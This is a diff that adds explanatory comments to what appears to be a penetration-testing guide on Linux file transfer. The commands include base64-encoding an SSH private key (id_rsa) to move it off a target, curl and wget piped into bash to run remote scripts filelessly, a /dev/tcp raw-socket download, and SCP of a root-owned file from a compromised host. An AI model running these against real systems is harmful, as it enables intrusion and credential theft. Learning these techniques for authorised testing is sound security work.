@@ -31,6 +31,7 @@ All three used **HTTP/HTTPS** — the most common protocol for malware communica
 ```bash
 md5sum id_rsa
 ```
+> Computes the MD5 hash of the source file so you can verify integrity after transfer; swap `id_rsa` for your file.
 
 ```
 4e301756a07ded0a2dd6953abf015278  id_rsa
@@ -54,6 +55,7 @@ LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
 ```bash
 echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...' | base64 -d > id_rsa
 ```
+> Decodes the pasted base64 string back into the original file on the target; replace the string with your encoded blob and `id_rsa` with the output filename.
 
 #### Step 4: Verify MD5 Hashes Match
 
@@ -107,6 +109,7 @@ Linux pipes make fileless execution natural — download and execute directly in
 ```bash
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
+> Downloads a script and pipes it straight into bash for in-memory execution; swap the URL for the script you want to run filelessly.
 
 #### Fileless with wget
 
@@ -130,18 +133,21 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 ```bash
 exec 3<>/dev/tcp/10.10.10.32/80
 ```
+> Opens a raw TCP socket to the web server using Bash's built-in /dev/tcp; replace the IP and port 80 with your attack host's address and port.
 
 #### Step 2: Send HTTP GET Request
 
 ```bash
 echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 ```
+> Sends a raw HTTP GET request through the opened socket (fd 3); change `/LinEnum.sh` to the path of the file you want to fetch.
 
 #### Step 3: Print the Response
 
 ```bash
 cat <&3
 ```
+> Reads the HTTP response back from the socket and prints it; redirect to a file (`cat <&3 > out`) and strip headers to save the downloaded content.
 
 > **When to use this:** Last resort when you have a bare Bash shell with no other tools. Rare but critical to know.
 
@@ -157,12 +163,14 @@ cat <&3
 sudo systemctl enable ssh
 sudo systemctl start ssh
 ```
+> Enables and starts the SSH daemon on your attack machine so the target can SCP files to/from you; no values to change.
 
 #### Verify SSH Is Listening
 
 ```bash
 netstat -lnpt
 ```
+> Lists listening TCP sockets to confirm sshd is bound on port 22; no values to change.
 
 ```
 Proto Recv-Q Send-Q Local Address     Foreign Address     State       PID/Program name
@@ -174,6 +182,7 @@ tcp        0      0 0.0.0.0:22        0.0.0.0:*           LISTEN      -
 ```bash
 scp plaintext@192.168.49.128:/root/myroot.txt .
 ```
+> Pulls a file from the remote host to your current directory over SSH; swap the user, IP, and remote path for your target.
 
 > **Tip:** Create a temporary user account for file transfers — don't use your primary credentials on a remote compromised machine.
 
@@ -190,12 +199,14 @@ Secure upload using Python's `uploadserver` module with a self-signed certificat
 ```bash
 sudo python3 -m pip install --user uploadserver
 ```
+> Installs the Python uploadserver module on your attack machine to receive uploaded files; no values to change.
 
 #### Step 2: Create Self-Signed Certificate
 
 ```bash
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 ```
+> Generates a self-signed TLS certificate/key pair (server.pem) for the HTTPS upload server; change the output filename or CN if desired.
 
 #### Step 3: Start HTTPS Upload Server
 
@@ -205,6 +216,7 @@ mkdir https && cd https
 
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
+> Starts an HTTPS server with the self-signed cert that accepts file uploads at /upload; change 443 if the port is busy or the cert path if different.
 
 ```
 File upload available at /upload
@@ -239,6 +251,7 @@ Start a web server on the **compromised target**, then download files from your 
 # On compromised target — serve files from current directory
 python3 -m http.server 8000
 ```
+> Serves the current directory over HTTP on the target so you can pull files from it; change 8000 if the port is in use.
 
 #### Download from Attack Machine
 
@@ -301,6 +314,7 @@ php -S 0.0.0.0:8000
 # Ruby
 ruby -run -ehttpd . -p8000
 ```
+> Quick one-liner web servers in Python/PHP/Ruby for serving the current directory; change port 8000 to any free port.
 
 ---
 
